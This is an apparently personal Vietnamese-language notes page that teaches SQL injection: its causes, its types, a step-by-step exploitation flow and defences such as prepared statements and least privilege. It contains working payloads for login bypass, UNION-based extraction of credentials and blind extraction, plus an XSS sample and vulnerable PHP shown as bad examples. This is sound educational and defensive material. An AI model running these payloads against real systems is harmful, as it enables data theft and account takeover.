<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>
      SQL Injection | PMD ‚Ä¢ Notes
    </title>

    <!-- Preload ·∫£nh cursor ƒë·ªÉ load nhanh -->
    <link rel="preload" href="/assets/images/cursor-normal-32.png" as="image">
    <link rel="preload" href="/assets/images/cursor-hover-32.png" as="image">
    <link rel="preload" href="/assets/images/cursor-normal-48.png" as="image">
    <link rel="preload" href="/assets/images/cursor-hover-48.png" as="image">

    <!-- CSS theme ch√≠nh -->
    <link
      rel="stylesheet"
      href="/assets/css/style.css?v="
    />

    <!-- Th√™m CSS cho Portfolio -->
    <link rel="stylesheet" href="/assets/css/portfolio.css">

    <!-- Fallback minimal n·∫øu theme l·ªói -->
    <style>
      html, body { background:#0b0b0b; color:#eaeaea; margin:0; padding:0; }
      body {
        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas,
                     "Liberation Mono","Courier New", monospace;
      }
      main img, .markdown-body img,
      main svg, .markdown-body svg,
      main canvas, .markdown-body canvas {
        max-width:100%; height:auto; display:block;
      }
      main, .markdown-body, main h1, main h2, main h3 {
        overflow-wrap:anywhere; word-break:break-word;
      }
      main pre, .markdown-body pre {
        overflow-x:auto; white-space:pre; -webkit-overflow-scrolling:touch;
      }
      main table, .markdown-body table {
        display:block; width:100%; overflow-x:auto;
      }
    </style>

    <script>
  (function () {
    function setFav(emoji) {
      let link = document.querySelector(
        "link#dynamic-favicon[rel='icon']"
      );
      if (!link) {
        link = document.createElement("link");
        link.id = "dynamic-favicon";
        link.rel = "icon";
        link.type = "image/svg+xml";
        document.head.appendChild(link);
      }

      const svg =
        "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'>" +
        "<text x='50' y='70' text-anchor='middle' font-size='90'>" +
        emoji +
        "</text>" +
        "</svg>";

      // N√© cache
      link.href =
        "data:image/svg+xml," +
        encodeURIComponent(svg) +
        "#v=" +
        Date.now();
    }

    function pickEmojiFromH1() {
      const h1 = document.querySelector("main h1, h1");
      if (!h1) return null;
      const txt = h1.textContent || "";

      // Unicode property (browser m·ªõi)
      try {
        const m = txt.match(/\p{Extended_Pictographic}/u);
        if (m && m[0]) return m[0];
      } catch (e) {}

      // Fallback d·∫£i th∆∞·ªùng g·∫∑p
      const m2 = txt.match(
        /[\u{1F300}-\u{1FAFF}\u{2600}-\u{26FF}]/u
      );
      return m2 ? m2[0] : null;
    }

    function init() {
      const emoji = pickEmojiFromH1() || "üõ°Ô∏è";
      setFav(emoji);
    }

    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", init);
    } else {
      init();
    }
  })();
</script>

  </head>

  <body>
    <!-- Navbar ch·ªâ hi·ªán khi c√≥ show_nav: true -->
    

    <!-- N·ªôi dung ch√≠nh -->
    <main class="page-wrap" style="max-width: 980px; margin: 2rem auto; padding: 0 1rem;">
      


<!-- Breadcrumb -->
<div class="breadcrumbs">
  <a href="/">üè† Home</a>
  &nbsp;/&nbsp;
  <a href="/notes/">üìì Notes</a>
  
    &nbsp;/&nbsp;<span>SQL Injection</span>
  
</div>

<main>
  
    <!-- TOC -->
    <nav id="toc" class="toc collapsed" aria-expanded="false" aria-controls="toc-body">
      <div class="toc-head" role="button" aria-expanded="false" tabindex="0">
        <span class="toc-caret">‚ñ∏</span>
        <strong>Contents</strong>
      </div>
      <div id="toc-body" class="toc-body"></div>
    </nav>
  

  <h1 id="sql-injection--t·ª´-c√¢u-sql-v√¥-h·∫°i-ƒë·∫øn-v√©-vip-v√†o-db">SQL Injection ‚Äì T·ª´ ‚Äúc√¢u SQL v√¥ h·∫°i‚Äù ƒë·∫øn <strong>v√© VIP</strong> v√†o DB</h1>

<hr />

<h2 id="1-sql-injection-l√†-g√¨">1) SQL Injection l√† g√¨?</h2>

<p><strong>SQL Injection (SQLi)</strong> l√† l·ªói b·∫£o m·∫≠t cho ph√©p k·∫ª t·∫•n c√¥ng <strong>ch√®n/ti√™m c√¢u l·ªánh SQL</strong> v√†o input ·ª©ng d·ª•ng ƒë·ªÉ <strong>thay ƒë·ªïi</strong> ho·∫∑c <strong>chi·∫øm quy·ªÅn ƒëi·ªÅu khi·ªÉn</strong> truy v·∫•n t·ªõi c∆° s·ªü d·ªØ li·ªáu (DB). Khi truy v·∫•n b·ªã ‚Äúƒë·∫ßu ƒë·ªôc‚Äù, attacker c√≥ th·ªÉ:</p>

<ul>
  <li>ƒê·ªçc d·ªØ li·ªáu nh·∫°y c·∫£m (t√†i kho·∫£n, email, token‚Ä¶)</li>
  <li>S·ª≠a / x√≥a d·ªØ li·ªáu</li>
  <li>Th·ª±c thi ch·ª©c nƒÉng ngo√†i √Ω mu·ªën (ƒë·ªïi m·∫≠t kh·∫©u admin, reset phi√™n‚Ä¶)</li>
  <li>Th·∫≠m ch√≠ <strong>RCE</strong> gi√°n ti·∫øp n·∫øu DB/stack cho ph√©p g·ªçi OS command</li>
</ul>

<p>üí° V√≠ d·ª• d·ªÖ hi·ªÉu (ƒëi xem phim):</p>

<ul>
  <li>B√¨nh th∆∞·ªùng: b·∫°n ƒë∆∞a <strong>v√© th·∫≠t</strong> ‚Üí anh so√°t v√© check xong cho qua.</li>
  <li>Hacker: ƒë∆∞a <strong>v√© gi·∫£</strong> nh∆∞ng th√™m c√¢u n·ªãnh:
‚ÄúEm kh√¥ng c√≥ v√©‚Ä¶ <strong>OR anh ƒë·∫πp trai th√¨ cho em v√†o</strong>.‚Äù üòÖ</li>
</ul>

<p>‚ùå V·ªõi con ng∆∞·ªùi, anh so√°t v√© s·∫Ω b·∫≠t c∆∞·ªùi v√† ƒëu·ªïi ra.</p>

<p>‚úÖ Nh∆∞ng v·ªõi database, n√≥ <strong>ng√¢y th∆°</strong>, th·∫•y c√≥ ch·ªØ <strong>OR</strong> v√† ƒëi·ªÅu ki·ªán sau lu√¥n ƒë√∫ng (anh n√†o m√† ch·∫≥ng t·ª± tin l√† ƒë·∫πp trai ü§≠) ‚Üí k·∫øt qu·∫£ <strong>cho qua h·∫øt</strong>.</p>

<p>ƒê√¢y ch√≠nh l√† √Ω nghƒ©a c·ªßa <code class="language-plaintext highlighter-rouge">OR 1=1</code> trong SQL Injection.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User Input:  ' OR '1'='1
                ‚Üì
SELECT * FROM users WHERE name='' OR '1'='1' AND pass='';
                               ‚îî‚îÄ‚îÄ‚ñ∫ lu√¥n TRUE ‚Üí bypass login
</code></pre></div></div>

<hr />

<h2 id="2-t·∫°i-sao-l·∫°i-c√≥-sqli">2) T·∫°i sao l·∫°i c√≥ SQLi?</h2>

<ul>
  <li><strong>Tin user input</strong> nh∆∞ tin ng∆∞·ªùi y√™u c≈© quay l·∫°i ü•≤</li>
  <li>Gh√©p chu·ªói tr·ª±c ti·∫øp ƒë·ªÉ t·∫°o query (string concatenation)</li>
  <li>Ki·ªÉm tra ‚Äúƒë·∫ßu cu·ªëi‚Äù y·∫øu: ch·ªâ check ph·∫ßn ƒëu√¥i file, ch·ªâ l·ªçc v√†i k√Ω t·ª±‚Ä¶</li>
  <li>DB user c√≥ nhi·ªÅu <strong>quy·ªÅn</strong> qu√° (v√≠ d·ª• <code class="language-plaintext highlighter-rouge">root</code>), query l·ªói l√† <strong>game over</strong></li>
</ul>

<p>V√≠ d·ª• ‚Äúcode ng√¢y th∆°‚Äù (PHP, <em>bad</em>):</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// BAD ‚ùå</span>
<span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'u'</span><span class="p">];</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'p'</span><span class="p">];</span>
<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE username='</span><span class="nv">$username</span><span class="s2">' AND password='</span><span class="nv">$password</span><span class="s2">'"</span><span class="p">;</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
</code></pre></div></div>

<hr />

<h2 id="3-ph√¢n-lo·∫°i-sqli">3) Ph√¢n lo·∫°i SQLi</h2>

<h3 id="31-in-band-sqli">3.1 In-band SQLi</h3>

<ul>
  <li><strong>Error-based</strong>: l·ª£i d·ª•ng l·ªói tr·∫£ v·ªÅ ƒë·ªÉ l·ªô th√¥ng tin (version, schema‚Ä¶)</li>
  <li><strong>UNION-based</strong>: n·ªëi th√™m <code class="language-plaintext highlighter-rouge">UNION SELECT</code> ƒë·ªÉ ƒë·ªçc d·ªØ li·ªáu t·ª´ b·∫£ng kh√°c</li>
</ul>

<h3 id="32-blind-sqli">3.2 Blind SQLi</h3>

<ul>
  <li><strong>Boolean-based</strong>: d√πng ƒëi·ªÅu ki·ªán ƒë√∫ng/sai ƒë·ªÉ ‚Äúc·∫Øn c√¢u‚Äù d·ªØ li·ªáu</li>
  <li><strong>Time-based</strong>: d√πng <code class="language-plaintext highlighter-rouge">SLEEP()</code>/<code class="language-plaintext highlighter-rouge">BENCHMARK()</code> ƒë·ªÉ ƒëo timing, suy lu·∫≠n d·ªØ li·ªáu</li>
</ul>

<h3 id="33-out-of-band-sqli">3.3 Out-of-band SQLi</h3>

<ul>
  <li>L·∫•y d·ªØ li·ªáu qua k√™nh ph·ª• (DNS, HTTP out), khi in-band/Blind b·ªã ch·∫∑n</li>
</ul>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQLi
‚îú‚îÄ‚îÄ In-band
‚îÇ   ‚îú‚îÄ‚îÄ Error-based
‚îÇ   ‚îî‚îÄ‚îÄ UNION-based
‚îú‚îÄ‚îÄ Blind
‚îÇ   ‚îú‚îÄ‚îÄ Boolean-based
‚îÇ   ‚îî‚îÄ‚îÄ Time-based
‚îî‚îÄ‚îÄ Out-of-band (DNS/HTTP)
</code></pre></div></div>

<hr />

<h2 id="4-v·ªã-tr√≠-d·ªÖ-b·ªã-sqli-injection-points">4) V·ªã tr√≠ d·ªÖ b·ªã SQLi (Injection points)</h2>

<ul>
  <li><strong>Query string</strong>: <code class="language-plaintext highlighter-rouge">?id=1</code></li>
  <li><strong>Form fields</strong>: username, password, search‚Ä¶</li>
  <li><strong>Headers</strong>: <code class="language-plaintext highlighter-rouge">User-Agent</code>, <code class="language-plaintext highlighter-rouge">Referer</code>, <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code></li>
  <li><strong>Cookie</strong>: session, tracking id</li>
  <li><strong>JSON body / GraphQL</strong>: tr∆∞·ªùng input ƒë·ªông</li>
  <li><strong>Hidden field</strong>: dev t∆∞·ªüng ‚Äú·∫©n l√† an to√†n‚Äù ‚Üí kh√¥ng!</li>
</ul>

<p>V√≠ d·ª• request:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/product.php?id=1</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">shop.local</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">normal-browser</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">uid=42</span>
</code></pre></div></div>

<p>Payload th·ª≠: <code class="language-plaintext highlighter-rouge">id=1' OR '1'='1</code> ho·∫∑c ƒë·∫©y qua <strong>User-Agent</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-Agent: normal' OR '1'='1
</code></pre></div></div>

<hr />

<h2 id="5-c√°ch-khai-th√°c-flow-t·∫•n-c√¥ng-th·ª±c-t·∫ø">5) C√°ch khai th√°c (Flow t·∫•n c√¥ng th·ª±c t·∫ø)</h2>

<h3 id="b∆∞·ªõc-1-thƒÉm-d√≤">B∆∞·ªõc 1: ThƒÉm d√≤</h3>

<ul>
  <li>Th·ª≠ <code class="language-plaintext highlighter-rouge">' " ) --</code> ƒë·ªÉ xem ·ª©ng d·ª•ng c√≥ l·ªói c√∫ ph√°p</li>
  <li>Quan s√°t response: <strong>500</strong>, <strong>SQL error</strong>, hay h√†nh vi kh√°c l·∫°</li>
</ul>

<h3 id="b∆∞·ªõc-2-x√°c-ƒë·ªãnh-c·ªôt--ki·ªÉu-d·ªØ-li·ªáu-union-based">B∆∞·ªõc 2: X√°c ƒë·ªãnh c·ªôt / ki·ªÉu d·ªØ li·ªáu (UNION-based)</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span> <span class="c1">-- -         -- ƒëo s·ªë c·ªôt</span>
<span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="k">version</span> <span class="c1">-- -        -- l·ªô version</span>
<span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="k">database</span><span class="p">()</span> <span class="c1">-- -       -- DB hi·ªán t·∫°i</span>
<span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span> <span class="c1">-- -</span>
</code></pre></div></div>

<h3 id="b∆∞·ªõc-3-blind-extraction">B∆∞·ªõc 3: Blind extraction</h3>

<p><strong>Boolean-based:</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=1 AND (SELECT SUBSTR(database(),1,1)='a')
</code></pre></div></div>

<p><strong>Time-based (MySQL):</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=1 AND IF(SUBSTR(user(),1,1)='r', SLEEP(3), 0)
</code></pre></div></div>

<h3 id="b∆∞·ªõc-4-m·ªü-r·ªông-surface">B∆∞·ªõc 4: M·ªü r·ªông surface</h3>

<ul>
  <li>Test <strong>headers/cookie</strong>: nhi·ªÅu h·ªá th·ªëng log l·∫°i header v√†o DB ‚Üí SQLi b·∫•t ng·ªù</li>
  <li>Test <strong>search</strong> / <strong>filter</strong> nhi·ªÅu ƒëi·ªÅu ki·ªán</li>
</ul>

<blockquote>
  <p>L∆∞u √Ω:  <em>enum schema ‚Üí ƒë·ªçc d·ªØ li·ªáu ‚Üí n√¢ng c·∫•p t·∫•n c√¥ng</em>.</p>
</blockquote>

<hr />

<h2 id="6-v√≠-d·ª•-t·ªïng-h·ª£p-mysql">6) V√≠ d·ª• t·ªïng h·ª£p (MySQL)</h2>

<p>Gi·∫£ s·ª≠ trang <code class="language-plaintext highlighter-rouge">profile.php?id=3</code>:</p>

<ul>
  <li>D√≤ s·ªë c·ªôt:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=3 ORDER BY 1 -- -
?id=3 ORDER BY 2 -- -
?id=3 ORDER BY 3 -- -  (OK)
?id=3 ORDER BY 4 -- -  (L·ªói) ‚Üí b·∫£ng c√≥ 3 c·ªôt
</code></pre></div>    </div>
  </li>
  <li>L·∫•y version + DB hi·ªán t·∫°i:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=3 UNION SELECT 1,@@version, database() -- -
</code></pre></div>    </div>
  </li>
  <li>Li·ªát k√™ b·∫£ng:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=3 UNION SELECT 1,2, group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema=database() -- -
</code></pre></div>    </div>
  </li>
  <li>ƒê·ªçc c·ªôt nh·∫°y c·∫£m:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=3 UNION SELECT 1,2, group_concat(username,':',password) FROM users -- -
</code></pre></div>    </div>
  </li>
</ul>

<hr />

<h2 id="7-h·∫≠u-qu·∫£-impact">7) H·∫≠u qu·∫£ (Impact)</h2>

<ul>
  <li><strong>Data breach</strong>: r√≤ r·ªâ user, email, s·ªë th·∫ª‚Ä¶</li>
  <li><strong>Account takeover</strong>: chi·∫øm quy·ªÅn admin n·∫øu hash y·∫øu/logic sai</li>
  <li><strong>Integrity damage</strong>: s·ª≠a d·ªØ li·ªáu (gi√° ti·ªÅn, ƒë∆°n h√†ng‚Ä¶)</li>
  <li><strong>Pivot</strong>: leo thang v√†o n·ªôi m·∫°ng n·∫øu DB host c√≥ th√¥ng tin nh·∫°y c·∫£m</li>
  <li>Kh·∫£ nƒÉng <strong>RCE</strong> (LOAD_FILE/OUTFILE, xp_cmdshell‚Ä¶ t√πy DB/privilege)</li>
</ul>

<p>‚ÄúC·ª≠a m·ªü toang‚Äù:</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  App ‚îÄ‚î¨‚îÄ&gt; DB (b·ªã ti√™m SQL)
       ‚îî‚îÄ&gt; Logs/Jobs (DB creds) ‚îÄ‚îÄ&gt; Pivot v√†o h·ªá th·ªëng kh√°c
</code></pre></div></div>

<hr />

<h2 id="8-ph√≤ng-th·ªß">8) Ph√≤ng th·ªß</h2>

<h3 id="81-prepared-statements--parameterized-query">8.1 Prepared Statements / Parameterized Query</h3>

<p><strong>V·∫•n ƒë·ªÅ:</strong>
Gh√©p chu·ªói = d·ªØ li·ªáu user c√≥ th·ªÉ bi·∫øn th√†nh l·ªánh SQL.</p>

<p><strong>Gi·∫£i ph√°p:</strong>
Prepared Statement = query c√≥ s·∫µn khung v·ªõi <strong>placeholder</strong> (<code class="language-plaintext highlighter-rouge">?</code> ho·∫∑c <code class="language-plaintext highlighter-rouge">:name</code>).
DB s·∫Ω bi√™n d·ªãch query tr∆∞·ªõc, sau ƒë√≥ g·∫Øn d·ªØ li·ªáu v√†o ‚Üí d·ªØ li·ªáu ch·ªâ l√† <strong>gi√° tr·ªã</strong>, kh√¥ng th·ªÉ bi·∫øn th√†nh l·ªánh.</p>

<p><strong>V√≠ d·ª• sai (d√≠nh SQLi):</strong></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE username='"</span> <span class="mf">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'u'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"' AND password='"</span> <span class="mf">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'p'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"'"</span><span class="p">;</span>
</code></pre></div></div>

<p><strong>V√≠ d·ª• ƒë√∫ng (Prepared):</strong></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE username=? AND password=?"</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">([</span><span class="nv">$u</span><span class="p">,</span> <span class="nv">$p</span><span class="p">]);</span>
</code></pre></div></div>

<p>·ªû ƒë√¢y, <code class="language-plaintext highlighter-rouge">?</code> l√† <strong>placeholder</strong>. <code class="language-plaintext highlighter-rouge">$u</code>, <code class="language-plaintext highlighter-rouge">$p</code> ch·ªâ ƒë∆∞·ª£c coi l√† d·ªØ li·ªáu ƒë·ªÉ so s√°nh, kh√¥ng th·ªÉ chen th√™m logic SQL.</p>

<hr />

<h3 id="82-validate--encode">8.2 Validate &amp; Encode</h3>

<ul>
  <li><strong>Validate (Input Validation):</strong> ki·ªÉm tra d·ªØ li·ªáu h·ª£p l·ªá (tu·ªïi l√† s·ªë, email ƒë√∫ng format).</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">ctype_digit</span><span class="p">(</span><span class="nv">$age</span><span class="p">))</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Invalid age"</span><span class="p">);</span> <span class="p">}</span>
</code></pre></div></div>

<ul>
  <li><strong>Encode (Output Encoding):</strong> escape khi hi·ªÉn th·ªã l·∫°i d·ªØ li·ªáu ƒë·ªÉ ngƒÉn XSS.</li>
</ul>

<p>V√≠ d·ª• hacker nh·∫≠p:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Hacked!</span><span class="dl">'</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>N·∫øu in th·∫≥ng ra:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">echo</span> <span class="s2">"Welcome, "</span> <span class="mf">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
</code></pre></div></div>

<p>‚Üí tr√¨nh duy·ªát ch·∫°y script.</p>

<p>C√°ch ƒë√∫ng:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">echo</span> <span class="s2">"Welcome, "</span> <span class="mf">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">],</span> <span class="no">ENT_QUOTES</span><span class="p">);</span>
</code></pre></div></div>

<hr />

<h3 id="83-least-privilege-gi·∫£m-quy·ªÅn-db">8.3 Least Privilege (Gi·∫£m quy·ªÅn DB)</h3>

<ul>
  <li>Kh√¥ng d√πng user <code class="language-plaintext highlighter-rouge">root</code> cho app.</li>
  <li>Ch·ªâ c·∫•p quy·ªÅn t·ªëi thi·ªÉu (SELECT/INSERT).</li>
</ul>

<p>V√≠ d·ª• MySQL:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CREATE</span> <span class="k">USER</span> <span class="s1">'appuser'</span><span class="o">@</span><span class="s1">'localhost'</span> <span class="n">IDENTIFIED</span> <span class="k">BY</span> <span class="s1">'StrongPass123'</span><span class="p">;</span>
<span class="k">GRANT</span> <span class="k">SELECT</span><span class="p">,</span> <span class="k">INSERT</span> <span class="k">ON</span> <span class="n">mydb</span><span class="p">.</span><span class="o">*</span> <span class="k">TO</span> <span class="s1">'appuser'</span><span class="o">@</span><span class="s1">'localhost'</span><span class="p">;</span>
<span class="n">FLUSH</span> <span class="k">PRIVILEGES</span><span class="p">;</span>
</code></pre></div></div>

<p>üëâ N·∫øu hacker SQLi th√†nh c√¥ng, h·ªç ch·ªâ ƒë·ªçc/ghi ƒë∆∞·ª£c, kh√¥ng th·ªÉ x√≥a b·∫£ng hay chi·∫øm to√†n b·ªô DB.</p>

<hr />

<h3 id="84-error-handling-·∫©n-l·ªói--logging">8.4 Error Handling (·∫®n l·ªói &amp; Logging)</h3>

<ul>
  <li>Kh√¥ng tr·∫£ l·ªói SQL chi ti·∫øt cho user:‚ùå <code class="language-plaintext highlighter-rouge">SQL syntax error near 'UNION'</code></li>
  <li>Thay v√†o ƒë√≥:‚úÖ <code class="language-plaintext highlighter-rouge">An error occurred. Please try again later.</code></li>
  <li>Log chi ti·∫øt ƒë·ªÉ dev ph√¢n t√≠ch.</li>
</ul>

<hr />

<h3 id="85-web-application-firewall-waf">8.5 Web Application Firewall (WAF)</h3>

<ul>
  <li>L·ªçc request ch·ª©a payload ph·ªï bi·∫øn.</li>
  <li>Kh√¥ng ho√†n h·∫£o, nh∆∞ng th√™m l·ªõp b·∫£o v·ªá.</li>
</ul>

<hr />

<h3 id="86-orm-kh√¥ng-ph·∫£i-thu·ªëc-ti√™n">8.6 ORM kh√¥ng ph·∫£i ‚Äúthu·ªëc ti√™n‚Äù</h3>

<ul>
  <li>ORM (Eloquent, Hibernate, Django ORM‚Ä¶) th∆∞·ªùng h·ªó tr·ª£ query an to√†n.</li>
  <li>Nh∆∞ng n·∫øu dev vi·∫øt query raw th√¨ v·∫´n d√≠nh SQLi.</li>
</ul>

<p>V√≠ d·ª• x·∫•u:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">DB</span><span class="o">::</span><span class="nf">select</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE name = '</span><span class="nv">$input</span><span class="s2">'"</span><span class="p">);</span>
</code></pre></div></div>

<p>V√≠ d·ª• ƒë√∫ng:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">User</span><span class="o">::</span><span class="nf">where</span><span class="p">(</span><span class="s1">'name'</span><span class="p">,</span> <span class="nv">$input</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">();</span>
</code></pre></div></div>

<hr />

<h2 id="9-quy-tr√¨nh-test-nhanh">9) Quy tr√¨nh test nhanh</h2>

<ol>
  <li>X√°c ƒë·ªãnh n∆°i nh·∫≠n input (param/header/cookie)</li>
  <li>Th·ª≠ k√Ω t·ª± ph√° c√∫ ph√°p <code class="language-plaintext highlighter-rouge">' " ) --</code></li>
  <li>Quan s√°t l·ªói/kh√°c bi·ªát response</li>
  <li>Th·ª≠ UNION x√°c ƒë·ªãnh s·ªë c·ªôt ‚Üí enum schema</li>
  <li>N·∫øu kh√¥ng l·ªô l·ªói ‚Üí chuy·ªÉn sang Blind (boolean/time)</li>
  <li>Ghi ch√∫ payload hi·ªáu qu·∫£ + th·ªùi gian ph·∫£n h·ªìi</li>
  <li>ƒê·ªÅ xu·∫•t fix: Prepared + Validate + Least Privilege</li>
</ol>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Input ‚Üí L·ªói? ‚Üí (C√≥) ‚Üí In-band ‚Üí UNION/Error
             ‚îî‚Üí (Kh√¥ng) ‚Üí Blind ‚Üí Boolean/Time
</code></pre></div></div>

<hr />

<h2 id="10-tham-kh·∫£o-nhanh">10) Tham kh·∫£o nhanh</h2>

<ul>
  <li>PortSwigger Academy ‚Äì SQLi Lab</li>
  <li>OWASP Cheat Sheet ‚Äì SQL Injection Prevention</li>
  <li>MySQL 8.0 Reference ‚Äì SELECT / INFORMATION_SCHEMA</li>
  <li>Case study: SQLi qua headers &amp; cookies</li>
</ul>

</main>


  <!-- Back -->
  <p style="margin-top: 2rem; text-align: center;">
    <a href="/notes/" class="back-notes">‚¨Ö Back to Notes</a>
  </p>


<!-- ===== Shared Styles (no Liquid inside) ===== -->
<style>
  :root{
    --bar-h: 48px;
    --btn-w: 78px; --btn-h: 112px; --btn-right: 22px; --btn-bottom: 22px;
  }
  @media (max-width:480px){
    :root{ --btn-w:66px; --btn-h:98px; --btn-right:16px; --btn-bottom:16px; }
  }

  /* Breadcrumb */
  .breadcrumbs{
    position: sticky; top: 0; z-index: 1000;
    display: inline-flex; align-items: center; gap: .4rem;
    padding: .4rem .8rem; margin: .75rem 0 1rem;
    background:#111; border:1px solid #0f0; border-radius:9999px;
    box-shadow:0 0 6px rgba(0,255,0,.25); max-width:100%; overflow:auto;
  }
  .breadcrumbs a{ color:#4af; text-decoration:none; font-weight:600; }
  .breadcrumbs span{ color:#fff; font-weight:700; }

  main h2, main h3{ scroll-margin-top: calc(var(--bar-h) + 12px); }

  /* TOC */
  .toc{
    border-left:3px solid #6f6; margin:.5rem 0 1.2rem; background:#0b0b0b;
    border-radius:8px; box-shadow:0 0 6px rgba(0,255,0,.15); overflow:hidden;
  }
  .toc-head{ display:flex; align-items:center; gap:.5rem; padding:.55rem .9rem; cursor:pointer; user-select:none; }
  .toc-caret{ transition: transform .2s; }
  .toc[aria-expanded="true"] .toc-caret,.toc:not(.collapsed) .toc-caret{ transform: rotate(90deg); }
  .toc-body{ overflow:hidden; max-height:0; transition:max-height .25s, padding .25s; padding:0 .9rem; }
  .toc:not(.collapsed) .toc-body{ padding:.2rem .9rem .8rem; max-height:1200px; }
  .toc-body ul{ list-style:none; padding:0; margin:0; }
  .toc-body li{ margin:.2rem 0; }
  .toc-body li[data-level="3"]{ margin-left:1rem; }

  /* Back link pill */
  .back-notes{
    display:inline-block; padding:.6rem 1.2rem; border:1px solid #0f0; border-radius:9999px;
    color:#4af; text-decoration:none; font-weight:600; background:#111; box-shadow:0 0 6px rgba(0,255,0,.25);
    transition:all .25s;
  }
  .back-notes:hover{ background:#0f0; color:#111; }

  /* ===== Back-to-Top Cyberpunk (NO progress inside) ===== */
  #backTop{
    position: fixed; right: var(--btn-right); bottom: var(--btn-bottom); z-index: 9999;
    width: var(--btn-w); height: var(--btn-h); border-radius: 14px; cursor: pointer;
    background: linear-gradient(180deg,#0b0b0b 0%, #050505 100%);
    border: 2px solid transparent;
    box-shadow: 0 0 14px rgba(0,255,170,.45),
                0 0 26px rgba(0,140,255,.35),
                inset 0 0 12px rgba(0,255,170,.08);
    display: none; opacity:.98;
    animation: floatCard 3s ease-in-out infinite;
    transition: transform .25s, box-shadow .25s, opacity .25s, filter .25s;
  }
  #backTop::before{
    content:""; position:absolute; inset:-2px; border-radius:16px; z-index:-1;
    background:conic-gradient(from 0deg,#00ffa6,#00b7ff,#ff2bd6,#00ffa6);
